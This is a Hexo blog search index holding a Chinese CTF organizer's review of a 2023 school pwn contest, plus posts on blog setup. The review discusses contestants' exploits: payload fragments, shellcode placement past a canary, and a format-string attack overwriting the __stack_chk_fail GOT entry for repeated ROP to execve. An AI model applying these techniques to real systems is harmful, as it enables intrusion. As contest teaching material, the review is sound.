<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/11/30/2023%E6%A0%A1%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/30/2023%E6%A0%A1%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="2023校赛总结"><a href="#2023校赛总结" class="headerlink" title="2023校赛总结"></a>2023校赛总结</h1><h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h3><ul><li>我是什么垃圾 出题给大佬做（瑟瑟发抖</li><li>大概就记录一下审WP过程中佬们的非预期和发现的题中的一些问题</li></ul><h3 id="1-signin"><a href="#1-signin" class="headerlink" title="1 signin"></a>1 signin</h3><ul><li><p>这题还有非预期我是没想到的 菜狗哭泣（当时出的时候也没多想 就按磐石那个出的来着</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 v4[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v4[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  put(argc, argv, envp);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, v4);<br>  <span class="hljs-keyword">if</span> ( v4[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">3</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> ( LODWORD(v4[<span class="hljs-number">0</span>]) == B )<br>    b4ckdo0r();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要符号位为1 低32位为0x42就行 至于高32位的数值位为多少都行</p></li><li><p>然后关于如何发送的问题</p><blockquote><p>但是这里读入用的是scanf，所以必须以字符串或者bytes的形式输入数字(X1ngCHEN师傅)</p></blockquote><p>p64是不行的 但我查了查p64就是将整数转换成字节啊？（不过我好像用p64只会是地址</p></li><li><p>patchelf还可以这样写(X1ngCHEN师傅)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --set-interpreter /home/akyuu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --replace-needed libc.so.6 /home/akyuu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6 pwn<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-EZest"><a href="#2-EZest" class="headerlink" title="2 EZest"></a>2 EZest</h3><ul><li><p>有的师傅只写了一个SigFrame<br>用<code>pop_rbp_ret</code>写&#x2F;bin&#x2F;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(pop_rbp_ret) + p64(bss - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x40110e</span>)<br>    <br>.text:000000000040110E <span class="hljs-number">48</span> C7 C0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rax, <span class="hljs-number">0</span><br>.text:0000000000401115 <span class="hljs-number">48</span> C7 C7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rdi, <span class="hljs-number">0</span>                          ; fd<br>.text:000000000040111C <span class="hljs-number">48</span> 8D <span class="hljs-number">75</span> F0                   lea     rsi, [rbp+buf]                  ; buf<br>.text:0000000000401120 <span class="hljs-number">48</span> C7 C2 <span class="hljs-number">00</span> 02 <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rdx, 200h                       ; count<br>.text:0000000000401127 0F 05                         syscall                                 ; LINUX - sys_read<br>.text:0000000000401129 C3                            retn<br>.text:0000000000401129<br>.text:0000000000401129                               main endp ; sp-analysis failed<br></code></pre></td></tr></table></figure></li><li><p>不过本来也是板子题</p></li></ul><h3 id="3-magicode"><a href="#3-magicode" class="headerlink" title="3 magicode"></a>3 magicode</h3><ul><li><p>这题可能出的还可以？？（小心翼翼 还好当时没有把这么丑的代码改掉😏 不然师傅们就觉得贼简单了</p></li><li><p>但这题之前说过 保护那里应该可以怎么弄不显示rwx段（FSCTF那</p></li><li><p>Ephemeral1y师傅真的强 手打shellcode来着<br>pANz0e师傅add(-10)也是可以的</p></li><li><p>还有Whhxy4师傅提到了绕过canary的问题</p><blockquote><p>alloca在汇编⾥⾯的效果是add rsp，rdx</p><p>也就是1是分配⼀个栈根据rbp的位置往下减，输⼊0就是在rbp-0x10的位置开始以此类推 ，这题有</p><p>canary所以输⼊0正好跳过canary </p><hr><p>emmm 我仔细看了一下 首先是sub rsp, rdx 然后是根据rsp的位置往下减，确实和canary无关 rbp的位置是固定的</p></blockquote><p>X1ngCHEN师傅说有爆破？ 啊出题和做题还是有些不同的 完全没考虑到<br>试了试X1ingCHEN师傅的exp，其实也并不用爆破 ，好像最后<code>\x10</code>完全没用到 每一次都能getshell的 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span>) + shellcode.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;\x10&#x27;</span><br></code></pre></td></tr></table></figure><p>嗯嗯 确实 magic函数的实现为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000001568 48 8B 45 E0                   mov     rax, [rbp+var_20]# 这个var_20我gdb看好像就是固定为0x20 然后这个位置存放的就是shellcode的起始位置<br>.text:000000000000156C FF D0                         call    rax<br></code></pre></td></tr></table></figure></li><li><p>好好好 alloca函数是为了对齐并且多0x10(可能是为了安全) 就是如果为alloca(0x60) 实际分配的是0x70 如果是alloca(0x64) 分配的也是0x70</p></li><li><p>gdb应该是能看到的会多分配0x10 alloca在汇编上的效果是<code>sub    rsp, rdx</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">这是执行完sub rsp, rdx以后 size输入的是0x20</span><br>0x555555555496 &lt;main+311&gt;    sub    rsp, rdx<br> ► 0x555555555499 &lt;main+314&gt;    mov    rdx, rax<br>   0x55555555549c &lt;main+317&gt;    and    edx, 0xfff<br>   0x5555555554a2 &lt;main+323&gt;    test   rdx, rdx<br>   0x5555555554a5 &lt;main+326&gt;    je     main+344                &lt;main+344&gt;<br> <br>   0x5555555554a7 &lt;main+328&gt;    and    eax, 0xfff<br>   0x5555555554ac &lt;main+333&gt;    sub    rax, 8<br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7fffffffdd10 ◂— 0xa3233 /* &#x27;32\n&#x27; */# alloca(0x20)以后rsp的位置<br>01:0008│     0x7fffffffdd18 ◂— 0x0<br>02:0010│     0x7fffffffdd20 —▸ 0x7fffffffdf18 —▸ 0x7fffffffe278 ◂— &#x27;/home/yech0/sskd/hectf2023/2magicode/magicode&#x27;zhe<br>03:0018│     0x7fffffffdd28 ◂— 0xe4c8453177346a00<br>04:0020│     0x7fffffffdd30 —▸ 0x7fffffffde00 ◂— 0x1<br>05:0028│     0x7fffffffdd38 —▸ 0x55555555543d (main+222) ◂— mov dword ptr [rbp - 0x2c], eax<br>06:0030│     0x7fffffffdd40 —▸ 0x555555558020 (stdout@GLIBC_2.2.5) —▸ 0x7ffff7e1a780 (_IO_2_1_stdout_) ◂— 0xfbad2887# rsp原先的位置<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">我这里gdb是如何实现多0x10的:(size输入0x20以后</span><br>   0x555555555445 &lt;main+230&gt;    lea    rdx, [rax + 8]rdx:0x28<br>   0x555555555449 &lt;main+234&gt;    mov    eax, 0x10    rax:0x10<br>   0x55555555544e &lt;main+239&gt;    sub    rax, 1    rax:0xf<br>   0x555555555452 &lt;main+243&gt;    add    rax, rdxrax:0x37<br>   0x555555555455 &lt;main+246&gt;    mov    esi, 0x10<br>   0x55555555545a &lt;main+251&gt;    mov    edx, 0<br>   0x55555555545f &lt;main+256&gt;    div    rsirax:0x3rd:0x7<br>   0x555555555462 &lt;main+259&gt;    imul   rax, rax, 0x10 rax:0x30<br></code></pre></td></tr></table></figure></li></ul><h3 id="4-fmt"><a href="#4-fmt" class="headerlink" title="4 fmt"></a>4 fmt</h3><ul><li><p>好好好 没有师傅用预期方法 菜狗爆哭 师傅们都太强了 </p></li><li><p>我都不道会有stack_chk_fail的利用 那其实能利用多次的话就完全不用给后门了 师傅们好像也没用（555555 有一个（蔚蓝师傅用了fini_array pANz0e师傅用了fini_array没有泄露libc 又改stack_chk_fail泄露然后利用后门</p></li><li><blockquote><p>读了题目都知道是格式化字符串漏洞了，但是正常情况下只能使用一次，这显然是无法让我们拿到shell的。</p><p>刚开始往格式化字符串泄露canary然后构造ROP的办法来想的，但是意识到第一步获得了canary又能干什么呢？啥都干不了，就exit了。所以我们不能这么平庸地看问题。</p><p>考虑到绕过Canary，不如与其正面硬刚，直接让Canary失效。</p><p>众所周知，如果程序检测到Canary被更改了，那么就会在函数结束的时候调用<strong>stk_chk_fail</strong>这个函数，然后就退出了。但是我们正是可以利用这一点，用格式化字符串更改stk_chk_fail的got表地址为main函数地址，那么就可以构造较长的payload来修改Canary从而可以无限次调用main函数，也是可以通过较短的payload不修改Canary来达到不接着调用</p><p>函数直接ret的效果。</p><p>既然可以控制main函数的执行了，那么我们也就可以控制格式化字符串漏洞的利用了。</p><p>于是我们这样利用漏洞：</p><p>1.第一次格式化字符串漏洞：修改__stk_chk_fail函数的got表地址为main函数地址。</p><p>2.第二次格式化字符串漏洞：获取栈上面__libc_start_main+128的地址。</p><p>3.第三次格式化字符串漏洞：构建并且输入ROP，但是这里payload的长度肯定会覆盖Canary，因此我们这里一定会进入下一层main函数，但是在下一层main函数我们随便传一个短短的字符串就行了，就可以不修改Canary从而达到退出执行上一层main函数输入的ROP的效果。</p><p>这里输入用的是scanf，遇到0d会截断，亲测system似乎打不通（我只试了本地，远程不知道），反正都有libc基址了，啥gedgets就都有了，而且ROP空间充足那么我们倒不如直接调用成功率更大的execve（X1ngCHEN师傅</p></blockquote><p>然后这里还有个问题就是高版本rop的话没有pop_rdi_ret的这种gadget 于是师傅们用了libc里的<br>上面还说到system打不通 有的师傅用了execve 有的用的onegaget</p></li><li><p>magicode和这题enllus1on师傅都拿了一血 magicode不用多说 应该是做过fcalc那个题 这个题写的exp看不懂（最强双非22级是吧 瑟瑟发抖</p></li><li><p>sublime text ctrl shif L多行编辑</p></li></ul><h3 id="5-风水小狮"><a href="#5-风水小狮" class="headerlink" title="5 风水小狮"></a>5 风水小狮</h3><ul><li>emmmm 这个应该没啥注意的 都是预期解</li></ul><h3 id="6-风水中狮"><a href="#6-风水中狮" class="headerlink" title="6 风水中狮"></a>6 风水中狮</h3><ul><li>又是enllus1on师傅 唯一解 真的强 %50$p和 %51%p都是flag的地址</li><li>沃趣 好像给的解释错了 给师傅们磕一个</li></ul><h3 id="7-风水大狮"><a href="#7-风水大狮" class="headerlink" title="7 风水大狮"></a>7 风水大狮</h3><ul><li>好家伙 田总说加载沙箱的代码忘写了 非预期了 没有绕沙箱也能做的 好家伙 除了Ephemeral1y师傅用了看不懂的链子<br>怪我怪我 没审好题</li><li>如果有沙箱的话 就得绕 但还没看懂</li></ul><h3 id="8-easyweb"><a href="#8-easyweb" class="headerlink" title="8 easyweb"></a>8 easyweb</h3><ul><li>就X1ngCHEN师傅的唯一解呢 预期解 看看就欧克</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo+github博客搭建</title>
    <link href="/2023/09/08/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/09/08/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<ul><li><p>贴一下参考链接</p><blockquote><p><a href="https://blog.csdn.net/weixin_45019350/article/details/121901433">https://blog.csdn.net/weixin_45019350/article/details/121901433</a></p><p><a href="https://zhuanlan.zhihu.com/p/60578464">https://zhuanlan.zhihu.com/p/60578464</a></p></blockquote></li><li><p>主题用的是<code>fluid</code></p><p>主题更换参考链接</p><blockquote><p><a href="https://blog.csdn.net/weixin_51545953/article/details/128499341">https://blog.csdn.net/weixin_51545953/article/details/128499341</a></p><p><a href="https://blog.csdn.net/weixin_49270402/article/details/117672195">https://blog.csdn.net/weixin_49270402/article/details/117672195</a> 里面的小彩蛋有图片网站(good)</p></blockquote></li><li><p>以管理员身份进入终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">切换到`d盘myblog`下<br>d:<br>cd my blog<br><br>修改配置信息<br><br>hexo clean<br>hexo g<br>hexo s# 就可以生成静态的页面，预览效果<br>hexo d# 部署到github上 可能会出现错误 多试几次就好<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">出现这些提示信息就部署上去了</span><br>Delta compression using up to 8 threads<br>Compressing objects: 100% (53/53), done.<br>Writing objects: 100% (81/81), 5.03 MiB | 628.00 KiB/s, done.<br>Total 81 (delta 33), reused 0 (delta 0), pack-reused 0<br>remote: Resolving deltas: 100% (33/33), completed with 7 local objects.<br>To https://github.com/yech0/yech0.github.io<br>   6165f62..b080b14  HEAD -&gt; master<br>Branch &#x27;master&#x27; set up to track remote branch &#x27;master&#x27; from &#x27;https://github.com/yech0/yech0.github.io&#x27;.<br>[32mINFO [39m Deploy done: [35mgit[39m<br></code></pre></td></tr></table></figure></li><li><p>还有个问题就是背景图片加载太慢了 我已经尽量压缩了 但还是慢（就图片慢 其他的效果很快的</p><p><del>会不会换个源会好一点？下次试试</del></p><p>用Google打开会快一点 火狐比较慢，</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/24/hello-world/"/>
    <url>/2023/08/24/hello-world/</url>
    
    <content type="html"><![CDATA[<p>你发现了我<code>(*^_^*)</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
